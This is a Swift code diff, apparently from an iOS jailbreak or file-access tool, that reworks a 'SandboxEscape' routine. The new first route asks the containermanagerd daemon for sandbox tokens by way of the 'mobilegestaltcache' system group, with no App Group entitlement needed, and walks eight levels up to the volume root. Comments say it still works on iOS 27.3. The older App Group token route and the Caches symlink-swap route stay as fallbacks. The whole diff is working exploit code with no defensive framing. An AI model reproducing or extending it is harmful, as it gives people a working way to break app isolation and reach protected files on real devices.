@@ -354,10 +354,6 @@ enum SandboxEscape {
         }
         let isDirectory = (status.st_mode & S_IFMT) == S_IFDIR
 
-        guard let base = groupContainerPath(group) else {
-            throw Failure(code: -1, message: "App Group 容器不存在，签名里缺少 \(group) 的 entitlement")
-        }
-
         // iOS 27 先试标准 flags，iOS 26 先试备用 flags；成功的那组会记下来。
         let preferAlt = preferredAltFlags()
         let candidates: [UInt64] = preferAlt
@@ -365,23 +361,30 @@ enum SandboxEscape {
             : [standardFlags, altFlags]
 
         var lastCode: Int64 = -5
+        var trail: [String] = []
 
-        // ① part_domain：让 containermanagerd 自己把 part 解析到目标路径。
-        // 不移动 Caches，也不建符号链接。iOS 27.3 上 Caches 交换会让
-        // container_copy_sandbox_token 返回 NULL，这条不会。
-        let levels = partDomainLevels(group: group)
-        var denied = 0
-        if !partDomainBroken, Symbols.querySetPartDomain != nil {
+        /// 试一条 part_domain 通道：所有层数 × 所有 flags。
+        /// `denied` 等于组合总数时，说明 daemon 对这条通道整体拒绝，本轮不必再试。
+        func attempt(
+            _ containerClass: UInt64,
+            _ identifier: String,
+            _ levelList: [Int]
+        ) -> (session: EscapeSession?, denied: Int, last: Int64) {
+            var refused = 0
             for flags in candidates {
-                for level in levels {
+                for level in levelList {
                     let handle: Int64
                     do {
                         handle = try partDomainToken(
-                            path: canonical, group: group, levels: level, flags: flags
+                            path: canonical,
+                            containerClass: containerClass,
+                            identifier: identifier,
+                            levels: level,
+                            flags: flags
                         )
                     } catch let failure as Failure {
                         lastCode = failure.code
-                        if failure.code == -5 || failure.code == -6 { denied += 1 }
+                        if failure.code == -5 || failure.code == -6 { refused += 1 }
                         continue
                     }
 
@@ -410,15 +413,43 @@ enum SandboxEscape {
                         remember(session, key: canonical)
                     }
                     noteWorkingFlags(flags == altFlags)
-                    return session
+                    return (session, refused, lastCode)
                 }
             }
-            // 所有层数 × 所有 flags 都被 daemon 明确拒绝：本机不支持这条通道，别再试
-            if denied == candidates.count * levels.count { partDomainBroken = true }
+            return (nil, refused, lastCode)
         }
 
-        // ② Caches 符号链接交换：旧路径，26.x 与 27.0–27.2 上有效。
+        if Symbols.querySetPartDomain != nil {
+            // ① systemgroup：3105 唯一的签发路径（`bad_query` 传 NULL 走的那条）。
+            // 它不依赖签名里的 App Group，27.3 上仍然签发。
+            if !systemGroupBroken {
+                let result = attempt(
+                    containerClassSystemGroup, systemGroupIdentifier, systemGroupLevels
+                )
+                if let session = result.session { return session }
+                trail.append("systemgroup=\(result.last)")
+                if result.denied == candidates.count * systemGroupLevels.count {
+                    systemGroupBroken = true
+                }
+            }
+
+            // ② 自己的 App Group：少数版本允许，试一次不亏。
+            let groupLevels = partDomainLevels(group: group)
+            if !partDomainBroken {
+                let result = attempt(containerClassAppGroup, group, groupLevels)
+                if let session = result.session { return session }
+                trail.append("appgroup=\(result.last)")
+                if result.denied == candidates.count * groupLevels.count {
+                    partDomainBroken = true
+                }
+            }
+        }
+
+        // ③ Caches 符号链接交换：旧路径，26.x 主用。
         // 批量作用域内复用同一个交换，避免每个目标都移走/移回 Caches。
+        guard let base = groupContainerPath(group) else {
+            throw Failure(code: -1, message: "App Group 容器不存在，签名里缺少 \(group) 的 entitlement")
+        }
         let shared = activeSwap(for: group)
         let owned: CacheSwap?
         let swap: CacheSwap
@@ -468,7 +499,11 @@ enum SandboxEscape {
             lastCode = -8
         }
 
-        throw Failure(code: lastCode, message: describe(lastCode))
+        trail.append("swap=\(lastCode)")
+        throw Failure(
+            code: lastCode,
+            message: describe(lastCode) + "（" + trail.joined(separator: "，") + "）"
+        )
     }
 
     /// 只读够用；写文件前用这个（例如目标目录是新建的）。
@@ -531,7 +566,8 @@ enum SandboxEscape {
     /// `container_copy_sandbox_token` 返回 NULL（-6），而这条仍然签发。
     private static func partDomainToken(
         path: String,
-        group: String,
+        containerClass: UInt64,
+        identifier: String,
         levels: Int,
         flags: UInt64
     ) throws -> Int64 {
@@ -555,9 +591,9 @@ enum SandboxEscape {
         }
         defer { freeQuery(query) }
 
-        setClass(query, containerClassAppGroup)
-        let identifier = xpcString(group)
-        setGroups(query, identifier)
+        setClass(query, containerClass)
+        let value = xpcString(identifier)
+        setGroups(query, value)
         setPart(query, partCaches)
         setFlags(query, flags)
 
@@ -581,7 +617,16 @@ enum SandboxEscape {
         return handle
     }
 
+    /// 3105 的主路径：`bad_query` 传 `group_identifier = NULL`，用的是
+    /// systemgroup 里人人都能查的那个 group，**不需要签名里有任何 App Group**。
+    /// 它的容器在 `/private/var/containers/Shared/SystemGroup/<UUID>`，
+    /// 从 `<容器>/Library/Caches` 上溯 8 层到卷根。
+    private static let containerClassSystemGroup: UInt64 = 13
+    private static let systemGroupIdentifier = "systemgroup.com.apple.mobilegestaltcache"
+    private static let systemGroupLevels = [8, 9, 7]
+
     /// 签发通道。part_domain 不动磁盘，成功一次之后就一直用它。
+    private static var systemGroupBroken = false
     private static var partDomainBroken = false
 
     /// 发一次查询并 consume 拿到的 token。
@@ -606,9 +651,9 @@ enum SandboxEscape {
         }
         defer { freeQuery(query) }
 
-        setClass(query, containerClassAppGroup)
-        let identifier = xpcString(group)
-        setGroups(query, identifier)
+        setClass(query, containerClass)
+        let value = xpcString(identifier)
+        setGroups(query, value)
         setPart(query, partCaches)
         setFlags(query, flags)
 
